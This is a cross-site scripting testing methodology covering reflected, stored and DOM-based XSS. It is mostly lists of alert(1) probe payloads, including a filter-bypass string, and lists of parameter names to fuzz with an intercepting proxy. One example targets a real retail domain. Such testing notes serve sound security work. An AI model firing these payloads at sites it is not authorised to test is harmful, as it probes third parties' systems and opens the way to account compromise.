# Cross-Site Scripting (XSS) Methodology
(Check for unescaped input that runs JavaScript)
XSS Types
   • Reflected → input reflected and runs immediately
   • Stored → input saved and runs later
   • DOM-Based → input handled by JS in browser

1. # Reflected XSS
Test input in URL Paths (/), Hashs (#), or Query (?) parameters, Look for 200 OK and input showing in the Response or the DOM.
Example:

        GET /search?q=test123 → reflected  
try:
        GET /search?q=<script>alert(1)</script> -> Query Parameter 
        GET /search/<script>alert(1)</script> -> URL Path
        GET /search#<script>alert(1)</script> -> Hash Path


Intruder Payloads (URL/Query):
a. <script>alert(1)</script>
b. <img src=x onerror=alert(1)>
c. <svg/onload=alert(1)>
d. onmouseover=alert(1) x="
f. ’;alert(1);// 

Intruder Query Parameters {
?q=
?query=
?search=
?term=
?lang=
?locale=
?redirect=
?next=
?returnUrl=
?username=
?email=
?name=
?message=

}

Intruder URL Paths / Hash Parameters {
q=
query=
search=
term=
lang=
locale=
redirect=
next=
returnUrl=
username=
email=
name=
message=

}
 
Look in:
        • DOM
        • Response
        • HTML body
        • input fields (value="...")
        • error messages
        • reflected script tags





2. # Stored XSS
Input gets saved and shows up later, test forms that store user data (wishlist, bio, name)
Example:
        POST /profile
        {
           "bio": "<img src=x onerror=alert(1)>"
        }

        GET /account → alert(1)

<!-- Prioritize Endpoints likely to store or accept user input -->
<!-- Check Content-Security Policy -->

Stored XSS Intruder Payloads :
a. "<img src=x onerror=alert(1)>"
b. "</script><script>alert(1)</script>"
c. " onfocus=alert(1) "
d. "<svg/onload=alert(1)>"
e. %3Cscript%3Ealert(1)%3C/script%3E
f. <scr<script>ipt>alert(1)</scr</script>ipt>


Intruder Stored XSS Parameters {

"name"
"title"
"description"
"message"
"comment"
"notes"
"content"
"html"
"body"
"text"
"review"
"feedback"
"subject"
"value"
"nickname"
"label"
"query"
"email" 
"phone"
"address"
"allowed-origins"
"ROLE_CUSTOMER"
"resource_access"
"id"
"translation"

}

Works if alert(1) is stored in the Response, or fires later when viewing that field




3. # DOM-Based XSS
Payload in URL hash or param runs via JavaScript, No server involved
Example:
https://zooplus.com/dashboard#<script>alert(1)</script>

Look in JS:
        • location.hash
        • document.write
        • innerHTML
        • eval(...)

Test for both Hash Fragment (#) #<script>alert(1)</script> , and also
Query Param (?) ?q=<svg/onload=alert(1)>

Quick Payload Reference Use these in:
        • URLs
        • Params
        • JSON
        • Forms

Intruder Payloads : 
a. <script>alert(1)</script>
b. <img src=x onerror=alert(1)>
c. <svg/onload=alert(1)>
d. " onmouseover=alert(1)
e. ';alert(1);//  
f. </textarea><script>alert(1)</script>
g. %3Cscript%3Ealert(1)%3C/script%3E
h. <scr<script>ipt>alert(1)</scr</script>ipt>

Intruder URL Query Parameters : 
?returnUrl=
?redirect=
?next=
?url=
?page=
?target=
?ref=
?callback=
?lang=
?theme=
?template=
?allowed-origins=
?resource_access= 


Intruder Hash Fragment Parameters : 
#index=
#token=
#access=
#id=
#section=
#path=
#page=
#view=
#tab=
#theme=


Bonus Checks
   • CSP headers (Content-Security-Policy)
   • Filter bypass with broken HTML e.g <scr<script>ipt>alert(1)</scr</script>ipt>






